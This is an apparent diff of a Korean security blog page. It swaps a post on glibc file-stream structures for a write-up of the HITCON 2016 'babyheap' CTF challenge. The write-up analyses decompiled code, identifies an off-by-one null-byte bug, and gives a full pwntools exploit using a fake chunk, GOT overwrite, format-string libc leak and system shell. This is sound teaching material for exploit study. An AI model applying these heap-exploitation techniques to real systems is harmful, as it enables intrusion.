@@ -7,20 +7,20 @@
   
   
   
-  <title>File Structure | 귀찮다</title>
+  <title>Hitcon 2016 babyheap | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="12345struct _IO_FILE_plus&amp;#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&amp;#125;;  _IO_FILE_plus는 파일 스트림에서 쓰이는 구조체이다.  먼저 _IO_FILE file을 보면 1234567891011121314151617181920212223242526272829">
-<meta name="keywords" content="pwanble">
+  <meta name="description" content="hitcon 2016 babyheap">
+<meta name="keywords" content="ctf, pwnable">
 <meta property="og:type" content="article">
-<meta property="og:title" content="File Structure">
-<meta property="og:url" content="https://blog.haklog.xyz/2019/07/12/post-2/index.html">
+<meta property="og:title" content="Hitcon 2016 babyheap">
+<meta property="og:url" content="https://blog.haklog.xyz/2019/10/01/Hitcon-2016-babyheap/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="12345struct _IO_FILE_plus&amp;#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&amp;#125;;  _IO_FILE_plus는 파일 스트림에서 쓰이는 구조체이다.  먼저 _IO_FILE file을 보면 1234567891011121314151617181920212223242526272829">
+<meta property="og:description" content="hitcon 2016 babyheap">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-10-30T13:54:15.430Z">
+<meta property="og:updated_time" content="2019-10-31T12:15:31.012Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="File Structure">
-<meta name="twitter:description" content="12345struct _IO_FILE_plus&amp;#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&amp;#125;;  _IO_FILE_plus는 파일 스트림에서 쓰이는 구조체이다.  먼저 _IO_FILE file을 보면 1234567891011121314151617181920212223242526272829">
+<meta name="twitter:title" content="Hitcon 2016 babyheap">
+<meta name="twitter:description" content="hitcon 2016 babyheap">
   
   
     <link rel="icon" href="/img/one.png">
@@ -183,7 +183,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Ctf/" style="font-size: 10px;">Ctf</a> <a href="/tags/ctf-pwnable/" style="font-size: 15px;">ctf, pwnable</a> <a href="/tags/pwanble/" style="font-size: 10px;">pwanble</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-ctf/" style="font-size: 10px;">pwnable, ctf</a> <a href="/tags/pwnable-ctf-heap-fake-chunk/" style="font-size: 10px;">pwnable, ctf, heap, fake_chunk</a> <a href="/tags/pwnable-kernel/" style="font-size: 10px;">pwnable, kernel</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
+                        <a href="/tags/Ctf/" style="font-size: 10px;">Ctf</a> <a href="/tags/ctf-pwnable/" style="font-size: 15px;">ctf, pwnable</a> <a href="/tags/pwanble-ctf/" style="font-size: 10px;">pwanble, ctf</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-ctf/" style="font-size: 10px;">pwnable, ctf</a> <a href="/tags/pwnable-ctf-heap-fake-chunk/" style="font-size: 10px;">pwnable, ctf, heap, fake_chunk</a> <a href="/tags/pwnable-kernel/" style="font-size: 10px;">pwnable, kernel</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
                     </div>
                 </section>
                 
@@ -244,11 +244,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-post-2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Hitcon-2016-babyheap" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2019/07/12/post-2/" class="article-date">
-      <time datetime="2019-07-12T13:28:49.000Z" itemprop="datePublished">2019-07-12</time>
+      <a  href="/2019/10/01/Hitcon-2016-babyheap/" class="article-date">
+      <time datetime="2019-10-01T12:40:31.000Z" itemprop="datePublished">2019-10-01</time>
 </a>
 
     </div>
@@ -262,7 +262,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      File Structure
+      Hitcon 2016 babyheap
     </h1>
   
 
@@ -271,10 +271,14 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwnable/">pwnable</a>
+    </div>
+
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwanble/">pwanble</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-pwnable/">ctf, pwnable</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -284,30 +288,57 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <a id="more"></a> 
-
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>_IO_FILE_plus는 파일 스트림에서 쓰이는 구조체이다. </p>
-<p>먼저 _IO_FILE file을 보면</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="comment">//읽기 버퍼로써 사용된다. </span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"> </span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p> _flags - &gt; 파일 스트림의 속성을 나타냄(읽기 전용, 쓰기 전용 등등..)</p>
-<p>_IO_read_ptr, _IO_read_end, _IO_read_base  -&gt; 읽기 버퍼에 사용</p>
-<p>_IO_write_ptr,_IO_write_base,_IO_write_end -&gt; 쓰기 버퍼에서 사용</p>
-<p><em>IO_buf_end, _IO_buf_base - &gt; 예비 버퍼</em></p>
-<p>chain -&gt; 다음 파일 구조체를 가리키는 포인터이다.</p>
-<p>_fileno -&gt; open한 파일 디스크립터의 번호. (stdin의 경우 0이 기록된다.)</p>
-<ul>
-<li>note<blockquote>
-<p>파일 디스크립터는 close() 될 경우 닫힌 번호에 우선적으로 다음 파일 디스크립터가 할당된다.<br>close(2)를 할 경우 다음으로 open된 파일 디스크립터는 2에 할당된다.</p>
-</blockquote>
+        <p>hitcon 2016 babyheap</p>
+<a id="more"></a>
+<h2 id="ANALYZE-NOTE"><a href="#ANALYZE-NOTE" class="headerlink" title="ANALYZE NOTE"></a>ANALYZE NOTE</h2><ul>
+<li>MENU<ul>
+<li>NEW</li>
+<li>DELETE</li>
+<li>EDIT</li>
+<li>EXIT</li>
+</ul>
 </li>
 </ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>` `_<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ``JUMP_FIELD(``<span class="keyword">size_t</span>``, __dummy);</span><br><span class="line">    ``JUMP_FIELD(``<span class="keyword">size_t</span>``, __dummy2);</span><br><span class="line">    ``JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    ``JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    ``JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    ``JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    ``JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    ``<span class="comment">/* showmany */</span></span><br><span class="line">    ``JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    ``JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    ``JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    ``JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    ``JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    ``JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    ``JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    ``JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    ``JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    ``JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    ``JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    ``JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    ``JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    ``JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    ``get_column;</span><br><span class="line">    ``set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<hr>
+<ul>
+<li>NEW<ul>
+<li>0x18 크기의 힙을 생성한다.</li>
+<li>사이즈를 입력받아 헤더에 저장한다.</li>
+<li>해당 사이즈로 힙2(content)을 할당한다.</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *header_tmp; // rbx</span><br><span class="line">  _QWORD *v1; // rbx</span><br><span class="line"></span><br><span class="line">  if ( header )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;bye bye&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  header = malloc(0x18uLL);</span><br><span class="line">  if ( !header )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size :&quot;);</span><br><span class="line">  header_tmp = header;</span><br><span class="line">  *header_tmp = INPUT();</span><br><span class="line">  v1 = header;</span><br><span class="line">  v1[2] = malloc(*header);</span><br><span class="line">  if ( !*(header + 2) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Content:&quot;);</span><br><span class="line">  VULN_INPUT(*(header + 2), *header);</span><br><span class="line">  printf(&quot;Name:&quot;);</span><br><span class="line">  VULN_INPUT(header + 8, 8);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">------------</span><br><span class="line"></span><br><span class="line">* DELETE</span><br><span class="line">	* 플래그를 체크해서 오직 한번만 FREE할 수 있다.</span><br><span class="line">	* CONTENT -&gt; HEADER 순으로 FREE한다.</span><br></pre></td></tr></table></figure>
 
-<p>파일 관리에 사용되는 함수 포인터들을 모아둔 구조체이다.</p>
+<p>__int64 FREE_ONLY_ONE()<br>{<br>  if ( !header || dword_6020A8 )<br>  {<br>    puts(“bye bye”);<br>    _exit(0);<br>  }<br>  free(*(header + 2));<br>  free(header);<br>  header = 0LL;<br>  return ++dword_6020A8;<br>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">* EDIT</span><br><span class="line">	* 오직 한번만 edit 가능 </span><br><span class="line">	* header에 저장된 size만큼 header+2(header-&gt;content)에 저장한다.</span><br></pre></td></tr></table></figure>
+
+<p>int edit()<br>{<br>  if ( !header || dword_6020A4 )<br>  {<br>    puts(“bye bye”);<br>    _exit(0);<br>  }<br>  printf(“Content:”);<br>  VULN_INPUT(*(header + 2), *header);<br>  ++dword_6020A4;<br>  return puts(“Done!”);<br>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">* EXIT</span><br><span class="line">	* 나갈건지 말지 다시한번 결정가능 (SCANF로 읽어들임)</span><br></pre></td></tr></table></figure>
+
+<pre><code>else if ( v3 == 4 )
+{
+  printf(&quot;Really? (Y/n)&quot;, a2);
+  a2 = &amp;v4;
+  __isoc99_scanf(&quot;%2s&quot;, &amp;v4);
+  if ( v4 != aN[0] )
+    _exit(0);
+}  </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line">VULN</span><br><span class="line"></span><br><span class="line">-----------</span><br><span class="line"></span><br><span class="line">* OFF- BY - ONE</span><br></pre></td></tr></table></figure>
+
+<p>char *__fastcall sub_400975(char *a1, int a2)<br>{<br>  char *result; // rax<br>  int v3; // [rsp+1Ch] [rbp-4h]</p>
+<p>  v3 = read(0, a1, a2);<br>  if ( v3 &lt;= 0 )<br>  {<br>    puts(“Error”);<br>    _exit(-1);<br>  }<br>  result = &amp;a1[v3]; // 인덱스 1 초과<br>  *result = 0;<br>  return result;<br>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> ----------------</span><br><span class="line"></span><br><span class="line">EXPLOIT</span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* off - by - one으로 힙안에 있는 힙 포인터를 nullbyte로 overwrite 할 수 있다.</span><br><span class="line">* overwrite된 힙 포인터가 가리키는 주소는 scanf에 의해 할당된 힙 내부인데, 거기다가 조작된 주소-0x10에 fake chunk를 만들어준다.</span><br><span class="line">* fake chunk를 free시키면 chunk overlapping이 가능해지는데, 이걸 이용해 오버랩된 청크에 있는 got를 printf의 plt 로 바꾼다.</span><br><span class="line">* 포맷 스트링 버그로 leak &amp; 다시 got를 덮어 system으로 쉘 따면 된다.</span><br></pre></td></tr></table></figure>
+
+<p>from pwn import *</p>
+<p>eflag = 0x6020a4<br>def malloc(size, data, name):<br>        r.sendafter(‘:’, ‘1’)<br>        r.sendafter(‘:’, str(size))<br>        r.sendafter(‘:’, data)<br>        r.sendafter(‘:’, name)</p>
+<p>def free():<br>        r.sendafter(‘:’, ‘2’)</p>
+<p>def edit(pay):<br>        r.sendafter(‘:’, ‘3’)<br>        r.sendafter(‘:’, pay)</p>
+<p>def xit(data):<br>        r.sendafter(‘:’, ‘4’)<br>        r.sendlineafter(‘?’, data)</p>
+<p>r = process(“./babyheap”)<br>e = ELF(“./babyheap”)<br>l = ELF(“/lib/x86_64-linux-gnu/libc.so.6”)</p>
+<p>pay = ‘n’+”A”<em>4063+p64(0) +p64(0x71)<br>xit(pay)<br>malloc(32,”A”, “AAAAAAAAA”)<br>free()<br>payload = ‘’<br>payload += p64(0)</em>3<br>payload +=p64(0x21)<br>payload += p64(0x40)+p64(0)<br>payload+= p64(e.got[‘atoi’])+ p64(0x31)<br>malloc(96,payload,”b”)<br>edit(p64(e.plt[‘printf’]))#+p64(e.plt[‘__isoc99_scanf’]))<br>r.recvuntil(“:”)<br>r.sendline(“@%p/%p/%p/%p@”)<br>r.recvuntil(“@”)<br>data = r.recvuntil(“@\n”)<br>data = data.split(‘/‘)<br>libc = int(data[2],16)-0x11759c</p>
+<p>log.info(“[<em>] libc base : :”+str(hex(libc)))<br>#oneshot = libc + 0x4525a<br>#log.info(“[</em>] MAGIC” + str(hex(oneshot)))<br>system = libc + l.symbols[‘system’]<br>r.recvuntil(“:”)<br>r.send(“%9$nAAAA”+p64(eflag))</p>
+<p>#pause()<br>r.recvuntil(“:”)<br>r.sendline(“AA”)<br>r.sendlineafter(“:”, p64(system))<br>r.send(“/bin/sh\x00”)</p>
+<p>r.interactive()<br>```</p>
 
       
     </div>
@@ -316,28 +347,28 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2019/07/12/post-2/">File Structure</a></p>
+        <p><span>제목:</span><a  href="/2019/10/01/Hitcon-2016-babyheap/">Hitcon 2016 babyheap</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2019년07월12일 - 22시28분</p>
-        <p><span>마지막 업데이트:</span>2019년10월30일 - 22시54분</p>
+        <p><span>발행 시간:</span>2019년10월01일 - 21시40분</p>
+        <p><span>마지막 업데이트:</span>2019년10월31일 - 21시15분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2019/07/21/DEFCON 2019 speedrun010/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a  href="/2019/10/23/post-1/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          Defcon 2019 speedrun 010
+          Kernel Module
         
       </div>
     </a>
   
   
-    <a  href="/2019/04/03/heapbabe/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Codegate 2018 final heapbabe</div>
+    <a  href="/2019/07/21/DEFCON 2019 speedrun010/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Defcon 2019 speedrun 010</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -349,7 +380,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ANALYZE-NOTE"><span class="toc-number">1.</span> <span class="toc-text">ANALYZE NOTE</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -445,18 +476,18 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2019/07/21/DEFCON 2019 speedrun010/" title="上一篇: Defcon 2019 speedrun 010">
+            <a  href="/2019/10/23/post-1/" title="上一篇: Kernel Module">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2019/04/03/heapbabe/" title="下一篇: Codegate 2018 final heapbabe">
+            <a  href="/2019/07/21/DEFCON 2019 speedrun010/" title="下一篇: Defcon 2019 speedrun 010">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/post-3/">fsop - basic</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/post-1/">Kernel Module</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/29/Hitcon-2016-babyheap/">Hitcon 2016 babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/DEFCON 2019 speedrun010/">Defcon 2019 speedrun 010</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/12/post-2/">File Structure</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/heapbabe/">Codegate 2018 final heapbabe</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/post-3/">fsop - basic</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/post-1/">Kernel Module</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Hitcon-2016-babyheap/">Hitcon 2016 babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/DEFCON 2019 speedrun010/">Defcon 2019 speedrun 010</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/mmaloc/">Trust 2019 - mmalloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/post-2/">File Structure</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/heapbabe/">Codegate 2018 final heapbabe</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
